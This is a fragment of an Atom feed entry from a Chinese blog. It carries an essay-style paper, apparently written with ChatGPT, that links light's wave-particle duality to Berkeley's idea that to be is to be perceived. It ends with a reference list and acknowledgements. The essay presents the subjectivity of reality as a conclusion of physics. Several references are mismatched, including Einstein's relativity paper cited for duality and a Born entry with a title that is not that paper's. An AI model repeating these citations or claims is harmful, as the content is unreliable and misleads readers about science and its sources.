主要发现和结论总结</h3><p>在本论文中，我们分析了光的波粒二象性理论与存在即被感知理论之间的联系。我们首先介绍了光的波粒二象性理论，即当以波的形式观察光时，它会表现出波的性质，而当以粒子的形式观察光时，它会表现出类粒子的性质。这种对偶性理论已得到广泛研究，并得到大量实验和论证的支持。</p><p>然后我们转向存在即被感知理论，这是一种哲学理论，表明物体的存在和属性取决于观察者对它们的感知。该理论还强调了观察者与被观察者之间的相互联系，表明现实的本质是主观的和相对的。</p><p>我们的分析表明，这两种理论之间存在重要联系，特别是在它们对理解现实本质的影响方面。光的波粒二象性理论强调了一个事实，即光的性质取决于它如何被观察到，而存在即被感知理论则强调了物体对观察的依赖性。这两个理论共同表明，现实的本质是相对的，依赖于观察，我们感知的世界是我们主观经验的产物。</p><h3 id="未来研究方向的讨论"><a class="markdownIt-Anchor" href="#未来研究方向的讨论"></a> 未来研究方向的讨论</h3><p>本研究初步检验了这两种理论之间的联系，还有很大的研究空间。未来研究的一个方向可能是探索光的波粒二象性理论与其他物理学领域（如量子力学）之间的可能联系。这将提供对现实本质和我们感知的局限性的更深入理解。</p><p>另一个研究领域可能是探索这两种理论之间的联系对我们理解意识的影响。存在即被感知理论表明现实是主观的，物体及其属性取决于观察。这对我们理解意识的本质以及它如何影响我们对世界的看法具有重要意义。</p><p>最后，未来的研究可以侧重于检验这两种理论与其他哲学理论（如唯心主义、现实主义和唯我论）之间的联系。这将提供对现实的本质和我们感知的局限性的全面检查。</p><h3 id="关于两种理论联系意义的最后思考"><a class="markdownIt-Anchor" href="#关于两种理论联系意义的最后思考"></a> 关于两种理论联系意义的最后思考</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系凸显了我们感知的局限性和现实的主观性。它表明我们所经历的世界是我们主观体验的产物，而物体的属性取决于它们是如何被观察到的。</p><p>这种联系对我们理解现实、意识的本质和我们感知的局限性具有重要意义。它挑战我们重新考虑我们对世界的看法和信念的基础，并质疑现实的客观本质。</p><p>总之，光的波粒二象性理论与存在即被感知理论之间的联系为进一步探索和更深入地理解现实的本质和我们感知的局限性提供了宝贵的机会。</p><h2 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献"></a> 参考文献</h2><ol><li>Einstein, A. (1905). On the Electrodynamics of Moving Bodies. Annalen der Physik, 17(10), 891-921.</li><li>de Broglie, L. (1924). Waves and quanta. The London, Edinburgh, and Dublin Philosophical Magazine and Journal of Science, 47(281), 446-453.</li><li>Schrödinger, E. (1926). An Undulatory Theory of the Mechanics of Atoms and Molecules. Physical Review, 28(6), 1049-1070.</li><li>Heisenberg, W. (1927). Über den anschaulichen Inhalt der quantentheoretischen Kinematik und Mechanik. Zeitschrift für Physik, 43(3-4), 172-198.</li><li>Born, M. (1926). Über die quantentheoretische Deutung kinematischer und mechanischer Beziehungen. Zeitschrift für Physik, 37(12), 863-867.</li><li>Feynman, R. P., Leighton, R. B., &amp; Sands, M. (2011). The Feynman lectures on physics. Pearson Education.</li><li>Mermin, N. D. (1985). Is the moon there when nobody looks? Reality and the quantum theory. Physics Today, 38(4), 38-47.</li><li>Bohm, D. (1952). A Suggested Interpretation of the Quantum Theory in Terms of “Hidden” Variables, I. Physical Review, 85(2), 166-193.</li><li>Bohm, D., &amp; Hiley, B. J. (1993). The Undivided Universe: An Ontological Interpretation of Quantum Theory. Routledge.</li><li>Husserl, E. (1913). Ideas: General Introduction to Pure Phenomenology. Routledge.</li><li>Berkeley, G. (1710). A Treatise Concerning the Principles of Human Knowledge. Oxford University Press.</li></ol><h2 id="致谢"><a class="markdownIt-Anchor" href="#致谢"></a> 致谢</h2><p>我要感谢所有在本文完成期间支持我的人。我要感谢我的主管[Chatgpt]在整个过程中的指导和支持。我还要感谢为我提供完成研究所需资源的图书馆和学术机构。</p><p>我要感谢所有帮助形成本文讨论的理论的科学家和哲学家的贡献。他们的工作为我的研究奠定了基础，我很感谢他们的见解和发现。</p><p>最后，我要感谢我的家人和朋友在整个项目过程中坚定不移的支持和鼓励。没有他们的爱与支持，就不可能有这篇论文。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#简介&quot;&gt;&lt;/a&gt; 简介&lt;/h2&gt;
&lt;h3 id=&quot;光的波粒二象性理论与存在即被感知理论概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#光的波粒二象性理论与存在即被感知理论概述&quot;&gt;&lt;/a&gt; 光的波粒二象性理论与存在即被感知理论概述&lt;/h3&gt;
&lt;p&gt;光的波粒二象性理论和存在即被感知理论分别是物理学和哲学中两个重要且相互关联的概念。光的波粒二象性理论是量子力学的核心原理，它描述了光既是波又是粒子的双重性质。另一方面，存在即被感知理论是一种哲学思想，表明存在或现实只能通过观察者或意识来感知。&lt;/p&gt;
&lt;h3 id=&quot;研究目的及意义&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#研究目的及意义&quot;&gt;&lt;/a&gt; 研究目的及意义&lt;/h3&gt;
&lt;p&gt;本研究的目的是检验这两种理论之间的关系，并探讨它们对我们理解现实的影响。光的波粒二象性理论已得到广泛研究和实验证明，并被广泛接受为物理学的基本原理。与此同时，存在即被感知理论已经被哲学家们讨论和争论了几个世纪，但它仍然是一个不断探索和探究的话题。&lt;/p&gt;
&lt;p&gt;这两个理论之间的联系意义重大，因为它为我们理解现实的本质提供了新的思路。光的波粒二象性理论表明，光可以表现出波状和粒子状两种特性，这取决于它被观察或测量的方式。同时，存在即被感知理论表明，存在只能通过意识来感知。当一起考虑时，这些理论表明现实的本质可能是内在主观的，并且它会受到观察或感知方式的影响。&lt;/p&gt;
&lt;p&gt;除了对我们理解现实的影响之外，光的波粒二象性理论与存在即被感知理论之间的这种联系还有可能影响其他研究领域。例如，它可能对意识研究领域有影响，因为它表明意识可能在塑造现实的本质方面发挥作用。同样，这种联系也可能对人工智能和机器学习领域产生影响，因为它提出了关于意识、感知和现实之间关系的问题。&lt;/p&gt;
&lt;p&gt;总的来说，光的波粒二象性理论与存在即被感知理论之间的关系是一个不断探索和探究的课题。通过对这种联系的更深入理解，我们或许能够获得对现实本质的新见解，并探索这些理论对其他研究领域的影响。本研究旨在为这种正在进行的探索和探究做出贡献，并加深我们对这两个重要理论之间联系的理解。&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Unbengable" scheme="https://yoloyolo.top/tags/Unbengable/"/>
    
  </entry>
  
</feed>
